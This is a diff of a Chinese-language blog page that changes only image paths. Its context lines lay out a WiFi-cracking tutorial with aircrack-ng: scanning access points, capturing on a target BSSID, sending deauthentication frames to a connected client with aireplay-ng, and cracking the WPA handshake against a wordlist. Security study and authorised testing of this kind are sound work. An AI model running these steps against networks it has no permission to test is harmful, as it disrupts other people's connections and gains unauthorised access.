@@ -407,7 +407,7 @@
 <p>我忘了root密码，就sudo了</p>
 <h3 id="先要确定网卡信息"><a href="#先要确定网卡信息" class="headerlink" title="先要确定网卡信息"></a>先要确定网卡信息</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span> iwconfig</span><br></pre></td></tr></table></figure>
 
-<p><img src="E:%5CGithub-blog%5Cblog%5Csource_posts%5Caircrack-ng%E7%A0%B4%E8%A7%A3wifi%5Cimage-20210122144040045.png" alt="image-20210122144040045"></p>
+<p><img src="image-20210122144040045.png" alt="image-20210122144040045"></p>
 <p>如果是这样的界面，就表示成功了，如果没有wlan0这个信息</p>
 <p>那么可以</p>
 <p><img src="E:%5CGithub-blog%5Cblog%5Csource_posts%5Caircrack-ng%E7%A0%B4%E8%A7%A3wifi%5Cimage-20210122144222376.png" alt="image-20210122144222376"></p>
@@ -421,19 +421,19 @@
 
 <h3 id="获取附近AP信息"><a href="#获取附近AP信息" class="headerlink" title="获取附近AP信息"></a>获取附近AP信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
 
-<p><img src="E:%5CGithub-blog%5Cblog%5Csource_posts%5Caircrack-ng%E7%A0%B4%E8%A7%A3wifi%5Cimage-20210122150437246.png" alt="image-20210122150437246"></p>
+<p><img src="image-20210122150437246.png" alt="image-20210122150437246"></p>
 <p>这里解释几个参数：<br> BSSID(Basic Service SetIdentifier): AP 的MAC 地址。<br> ESSID(The Extended Service Set Identifier): AP 的名称。<br> PWR(Power): 信号强度。<br> Beacons: AP发出的通告编号，每个接入点（AP）在最低速率（1M）时差不多每秒会发送10个左右的beacon，所以它们能在很远的地方就被发现。<br> #Data:当前数据传输量。<br> #/s:过去10秒钟内每秒捕获数据分组的数量。<br> CH(Channel): AP 所在的频道。<br> MB: AP 的最大传输速度。MB=11 =&gt; 802.11b，MB=22 =&gt; 802.11b+， MB&gt;22 =&gt; 802.11g。后面带.的表示短封包标头，处理速度快，更利于破解。<br> ENC(Encryption): 使用的加密算法体系。<br> CIPHER: 检测到的加密算法。<br> AUTH(Authority): 认证方式。</p>
 <h3 id="开始抓包"><a href="#开始抓包" class="headerlink" title="开始抓包"></a>开始抓包</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng  --<span class="keyword">bssid </span><span class="keyword">BSSID </span>-c CH -w 文件位置 wlan0</span><br><span class="line"><span class="keyword">bssid </span>后面跟着目标目标<span class="keyword">bssid</span></span><br><span class="line"><span class="keyword">-c </span>后面跟着目标频道,必须要加,不加的话,airdump-ng会每个频道都试</span><br></pre></td></tr></table></figure>
 
-<p><img src="E:%5CGithub-blog%5Cblog%5Csource_posts%5Caircrack-ng%E7%A0%B4%E8%A7%A3wifi%5Cimage-20210122153234568.png" alt="image-20210122153234568"></p>
+<p><img src="image-20210122153234568.png" alt="image-20210122153234568"></p>
 <p>表示连接上此AP设备信息</p>
 <p>一定确保有设备连接到该网络,要不然没有办法抓到包</p>
 <h3 id="再另开一个终端"><a href="#再另开一个终端" class="headerlink" title="再另开一个终端"></a>再另开一个终端</h3><p>作为发送请求的客户端,输入一下命令</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng <span class="number">-0</span> <span class="number">10</span> -a BSSID -c STATION wlan0mon  # <span class="number">-0</span> 表示DeAuth模式，<span class="number">10</span>表示攻击次数，-c是第<span class="number">3</span> 步中的得到的STATION，即已连接上的客户端MAC 地址</span><br></pre></td></tr></table></figure>
 
-<p><img src="E:%5CGithub-blog%5Cblog%5Csource_posts%5Caircrack-ng%E7%A0%B4%E8%A7%A3wifi%5Cimage-20210122153827197.png" alt="image-20210122153827197"></p>
+<p><img src="image-20210122153827197.png" alt="image-20210122153827197"></p>
 <p>再回看上一个终端</p>
-<p><img src="E:%5CGithub-blog%5Cblog%5Csource_posts%5Caircrack-ng%E7%A0%B4%E8%A7%A3wifi%5Cimage-20210122153902137.png" alt="image-20210122153902137"></p>
+<p><img src="image-20210122153902137.png" alt="image-20210122153902137"></p>
 <p>右上角出现那个WPA handshake:….就证明成功抓到包了,就可以ctrl +c停止了</p>
 <h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w Wordlists.txt <span class="keyword">CAP</span>-01.<span class="keyword">cap</span> #-w表示字典包的路径， <span class="keyword">CAP</span> 表示第 1 步中保存的文件中 -01.<span class="keyword">cap</span> 文件，因为我们对每个 <span class="keyword">AP</span> 的尝试可能不止一次，所以 airodump-ng 会自动在文件名后加类似01，02这样的数字表示次数，所以记得最后破解的时候输入正确的 <span class="keyword">CAP</span> 包名称。</span><br></pre></td></tr></table></figure>
 
